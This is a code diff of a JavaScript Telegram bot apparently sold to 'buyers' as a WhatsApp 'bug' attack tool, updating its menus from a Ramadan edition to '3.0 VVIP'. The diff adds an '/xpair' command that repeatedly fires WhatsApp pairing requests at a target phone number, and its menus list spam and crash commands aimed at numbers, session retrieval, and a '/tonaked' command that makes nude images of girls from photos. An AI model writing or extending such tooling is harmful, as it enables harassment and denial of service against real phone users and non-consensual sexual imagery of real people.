@@ -354,21 +354,19 @@ async function validateToken() {
   const validTokens = await fetchValidTokens();
   if (!validTokens.includes(TOKEN_BOT)) {
     console.log(chalk.bold.red(`
-⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀
-⣼⣿⣿⣿⢿⣿⣟⣿⣿⣻⣿⣟⡿⠿⢯⡿⠿⢿⣽⣿⣿⣻⣿⢿⣻⣿⣿⢿⣿⣧
-⣿⣿⡿⣿⣿⣿⣻⣿⠿⠛⠉⠀⠀⢀⣴⣷⣀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣻⣿⣿⣿
-⣿⣿⣿⣿⣿⣽⠟⠁⠀⠀⠀⢀⣴⣿⣿⣿⠟⠁⠀⡀⠀⠀⠈⠻⣿⣽⣿⡿⣟⣿
-⣿⣿⡿⣷⣿⠃⠀⠀⠀⢀⣴⣿⣿⣿⠟⠁⠀⠀⣠⣷⣄⠀⠀⠀⠘⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⠃⠀⡀⠀⠘⢿⣿⣿⣿⣅⠀⠀⣠⣾⣿⣿⣿⣷⣄⠀⠀⠘⣿⣷⣿⣿
-⣿⣿⣽⡟⠀⢠⣧⡀⠀⠀⠙⢿⣿⣿⣷⣾⣿⣿⡿⠻⣿⣿⣿⣷⣄⠀⢹⣿⣿⣻
-⣿⣿⣿⡇⠰⣿⣿⣿⣦⡀⠀⠀⣹⣿⣿⣿⣿⣏⠀⠀⠈⠻⣿⣿⣿⡗⢸⣿⣿⣿
-⣿⣿⣾⣧⠀⠈⢻⣿⣿⣿⣦⣾⣿⣿⡿⢿⣿⣿⣷⣄⠀⠀⠈⠻⠃⠀⣸⣿⣿⣽
-⣿⣿⡿⣿⡄⠀⠀⠈⢻⣿⣿⣿⡿⠋⠀⠀⢙⣿⣿⣿⣷⡄⠀⠀⠀⢠⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⡄⠀⠀⠀⠈⠿⠋⠀⠀⢀⣴⣿⣿⣿⠿⠃⠀⠀⠀⢠⣿⣿⣿⣟⣿
-⣿⣿⣿⣾⣿⣿⣦⡀⠀⠀⠀⠀⠀⣴⣿⣿⣿⡟⠋⠀⠀⠀⢀⣴⣿⣿⣿⡿⣿⣿
-⣿⣿⣟⣿⣷⣿⣿⣿⣷⣤⣀⠀⠀⠈⠻⡟⠋⠀⠀⣀⣤⣾⣿⣿⣿⣿⡿⣿⣿⣿
-⢻⣿⣿⢿⣻⣿⣯⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣻⣷⣿⣿⣟⡏
-⠀⠙⠿⢿⣿⡿⣿⣿⣷⣿⢿⣿⢿⣿⡿⣿⣿⡿⣿⣿⣟⣯⣷⣿⣿⣿⣻⠯⠋⠀
+⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
+⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀
 Ente Siapa Anj?\nMinta Akses Ke @pinnxreal`));
           process.exit(1);
     }
@@ -580,22 +578,22 @@ bot.start(async (ctx) => {
     const caption = `
     \`\`\`
 ╭────────────────────╼
-│( 👑 )—𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖
+│( 👑 )— Archery Magic
 │◆ Developer : @pinnxreal
-│◆ Version : 2.0 Svip Ramadhan
+│◆ Version :  3.0 VVIP 
 │◆ System Online: ${runtime}
 │◆ User: ${username}
 │◆ System: Database
 ╰────────────────────╼
-💫 RAMADHAN KAREEM 1447H 💫
+🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
 ╭────────────────────╼
-│ ALL MENU BOT 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖 
+│ ALL MENU BOT  Archery Magic 
 │❒ HALAMAN 1 : BUGS MENU
 │❒ HALAMAN 2 : TOOLS MENU
 │❒ HALAMAN 3 : SETTINGS MENU
 │❒ HALAMAN 4 : THANKS TO MENU
 ╰────────────────────╼
-✨ Marhaban Ya Ramadhan ✨
+✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
 \`\`\`
 `;
 
@@ -633,22 +631,22 @@ bot.action("page1", async (ctx) => {
     const caption = `
     \`\`\`
 ╭────────────────────╼
-│( 👑 )—𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖
+│( 👑 )— Archery Magic
 │◆ Developer : @pinnxreal
-│◆ Version : 2.0 Svip Ramadhan
+│◆ Version :  3.0 VVIP 
 │◆ System Online: ${runtime}
 │◆ User: ${username}
 │◆ System: Database
 ╰────────────────────╼
-💫 RAMADHAN KAREEM 1447H 💫
+🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
 ╭────────────────────╼
-│ ALL MENU BOT 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖 
+│ ALL MENU BOT  Archery Magic 
 │❒ HALAMAN 1 : BUGS MENU
 │❒ HALAMAN 2 : TOOLS MENU
 │❒ HALAMAN 3 : SETTINGS MENU
 │❒ HALAMAN 4 : THANKS TO MENU
 ╰────────────────────╼
-✨ Marhaban Ya Ramadhan ✨
+✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
 \`\`\`
 `;
 
@@ -686,12 +684,12 @@ bot.action("page2", async (ctx) => {
   const caption = `
 \`\`\`
 ╭────────────────────╼
-│( 👑 )𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖 𝗩𝟮.𝟬
+│( 👑 ) Archery Magic  3.0 VVIP 
 │◆ Welcome To Menu Bugs! 
 │◆ Enjoy The Script All Buyer! 
 │◆ Gunakan Command Di Bawah! 
 ╰────────────────────╼
-💫 RAMADHAN KAREEM 1447H 💫
+🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
 ╭────────────────────╼
 │🪲 Bebas Spam - Menu
 ├ /XspecterARC 628xx
@@ -712,7 +710,7 @@ bot.action("page2", async (ctx) => {
 ├ /XghostARC 62xx
 │  ├ Delay Bebas Spam Anti Kenon
 ╰────────────────────╼
-✨ Marhaban Ya Ramadhan ✨
+✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
 \`\`\`
 `;
 
@@ -750,13 +748,13 @@ bot.action("page3", async (ctx) => {
   const caption = `
 \`\`\`
 ╭────────────────────╼
-│( 👑 )—𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖 𝗩𝟮.𝟬
+│( 👑 )— Archery Magic  3.0 VVIP 
 │◆ Developer : @pinnxreal
 │◆ Welcome To Tools Menu! 
 │◆ Enjoy The Script All Buyer
 │◆ Gunakan Command Di Bawah! 
 ╰────────────────────╼
-💫 RAMADHAN KAREEM 1447H 💫
+🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
 ╭───⊱( 🦄 ) Tools° - Menu
 │⬡ /csessions
 │╰┈➤ Retrieving Sessions 
@@ -785,7 +783,7 @@ bot.action("page3", async (ctx) => {
 │⬡ /tonaked [ Reply Image ]
 │╰┈➤ To Naked Girls
 ╰───────────────⊱
-✨ Marhaban Ya Ramadhan ✨
+✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
 \`\`\`
 `;
 
@@ -823,13 +821,13 @@ bot.action("page4", async (ctx) => {
   const caption = `
 \`\`\`
 ╭────────────────────╼
-│( 👑 )—𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖 𝗩𝟮.𝟬
+│( 👑 )— Archery Magic  3.0 VVIP 
 │◆ Developer : @pinnxreal
 │◆ Welcome To Settings Menu! 
 │◆ Enjoy The Script All Buyer! 
 │◆ Gunakan Command Di Bawah! 
 ╰────────────────────╼
-💫 RAMADHAN KAREEM 1447H 💫
+🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
 ╭───⊱( 🍁 ) Controls° - Menu
 │⬡ /delsessions 
 │╰┈➤ Delete Sessions
@@ -846,7 +844,7 @@ bot.action("page4", async (ctx) => {
 │⬡ /delprem ID
 │╰┈➤ Delete Premium Users
 ╰───────────────⊱
-✨ Marhaban Ya Ramadhan ✨
+✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
 \`\`\`
 `;
 
@@ -883,13 +881,13 @@ bot.action("page5", async (ctx) => {
   const caption = `
 \`\`\`
 ╭────────────────────╼
-│( 👑 )—𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖 𝗩𝟮.𝟬
+│( 👑 )— Archery Magic  3.0 VVIP 
 │◆ Developer : @pinnxreal
 │◆ Welcome To Thanks Menu! 
 │◆ Enjoy The Script All Buyer! 
 │◆ All Support! 
 ╰────────────────────╼
-💫 RAMADHAN KAREEM 1447H 💫
+🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
 ╭───⊱( 🍁 ) thanks to° - Menu
 │⬡ Xwarr
 │╰┈➤ Guru
@@ -897,10 +895,10 @@ bot.action("page5", async (ctx) => {
 │╰┈➤ Guru
 │⬡ Xata
 │╰┈➤ Sepuh
-│⬡ All Buyer 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖
+│⬡ All Buyer  Archery Magic
 │⬡ All Partner pinn
 ╰───────────────⊱
-✨ Marhaban Ya Ramadhan ✨
+✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
 \`\`\`
 `;
 
@@ -1871,6 +1869,76 @@ bot.command("tofigure", async (ctx) => {
   }
 });
 
+bot.command("xpair", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+    const args = ctx.message.text.split(" ")
+    const loopCount = parseInt(args[1])
+    const targetNumber = (args[2] || "").replace(/[^0-9]/g, "")
+
+    if (!args[1] || !args[2]) {
+      return ctx.reply(`🪧 ☇ Format: /xpair 10 62×××`)
+    }
+
+    const processMessage = await ctx.telegram.sendPhoto(
+      ctx.chat.id,
+      thumbnailUrl,
+      {
+        caption: `
+<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐮𝐱𝐳 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 ⎭ ⊰―—═⬡</pre></blockquote>
+⌑ Target: ${targetNumber}
+⌑ Type: Pair Spam
+⌑ Loop : ${loopCount}
+⌑ Status: Process`,
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [[
+            { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${targetNumber}` }
+          ]]
+        }
+      }
+    )
+
+    const processMessageId = processMessage.message_id
+
+    let success = 0
+    let fail = 0
+
+    for (let i = 0; i < loopCount; i++) {
+
+      try {
+        await pair(targetNumber)
+        success++
+      } catch (e) {
+        fail++
+      }
+
+      await new Promise(r => setTimeout(r, 3000))
+    }
+
+    await ctx.telegram.editMessageCaption(
+      ctx.chat.id,
+      processMessageId,
+      undefined,
+
+      `
+<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐮𝐱𝐳 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 ⎭ ⊰―—═⬡</pre></blockquote>
+⌑ Target: ${targetNumber}
+⌑ Type: Pair Spam
+⌑ Success: ${success}
+⌑ Failed : ${fail}
+⌑ Status: Finished`,
+
+      {
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [[
+            { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${targetNumber}` }
+          ]]
+        }
+      }
+    )
+
+})
+
 bot.command("getcode", checkOwnerOrAdmin, async (ctx) => {
   const senderId = ctx.from.id;
   const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
@@ -2193,7 +2261,7 @@ bot.command("iqc", async (ctx) => {
     }
 
     await ctx.replyWithPhoto({ source: buffer }, {
-      caption: `✅ Done Masseh By 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 𝗠𝗔𝗚𝗜𝗖 ( 🐦‍🔥 )`,
+      caption: `✅ Done Masseh By  Archery Magic ( 🐦‍🔥 )`,
       parse_mode: "Markdown"
     });
   } catch (e) {
